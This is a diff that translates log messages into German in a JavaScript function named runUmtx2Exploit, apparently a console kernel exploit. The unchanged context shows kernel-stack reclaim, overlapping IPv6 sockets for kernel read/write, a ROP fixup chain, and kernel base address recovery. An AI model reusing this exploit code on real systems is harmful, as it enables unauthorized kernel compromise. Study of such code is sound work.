@@ -1003,7 +1003,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         p.write8(kprimCommonData.thr_index, kprimId);
         p.write8(kprimCommonData.exit, 1);
 
-        await log(`Successfully reclaimed kstack (kprim_id = ${kprimId})`, LogLevel.SUCCESS);
+        await log(`KSTACK-ID = ${kprimId}`, LogLevel.SUCCESS);
         if (debug) await log("Waiting for all kprim threads to exit (except the winner thread)...", LogLevel.DEBUG);
 
         await waitForKprimThreadsState(threadStatus.EXITED, config.num_kprim_threads - 1);
@@ -1215,7 +1215,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
     await kstackKrwWriteQword(masterPktopts.add32(0x10), slavePktopts.add32(0x10));
 
-    await log(`Overlapped ipv6 sockets`, LogLevel.SUCCESS);
+    await log(`IPv6-Adressen gepatcht...`, LogLevel.SUCCESS);
 
     function chainPushWriteToVictim(addr) {
         chain.push_write8(masterBuffer, addr);
@@ -1418,20 +1418,20 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         fdsToFix.push(winnerLookupFd);
     }
     
-    await log("Creating fixup chain...", LogLevel.INFO);
+    await log("Fix-Patch erstellen...", LogLevel.INFO);
     chainPushIncSocketRefcount(masterSock);
     chainPushIncSocketRefcount(victimSock);
     chainPushFixupBadFds();
     chainPushFixupThreadKstack();
 
-    await log("Running fixup...", LogLevel.INFO);
+    await log("Fix-Patch ausführen...", LogLevel.INFO);
     await chain.run();
 
     await chain.syscall(SYS_CLOSE, winnerLookupFd);
 
-    await log("Fixes applied", LogLevel.SUCCESS);
+    await log("Fix-Patch erfolgreich...", LogLevel.SUCCESS);
 
-    await log("Looking for allproc...", LogLevel.INFO);
+    await log("Allproc suchen...", LogLevel.INFO);
     async function findAllproc() {
         let proc = curproc;
         const maxAttempt = 50;
@@ -1450,7 +1450,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     }
 
     const allProc = await findAllproc();
-    await log("Found allproc", LogLevel.INFO);
+    await log("Allproc gefunden...", LogLevel.INFO);
 
     const dataBase = allProc.sub32(OFFSET_KERNEL_ALLPROC - OFFSET_KERNEL_DATA);
     const textBase = dataBase.sub32(OFFSET_KERNEL_DATA);
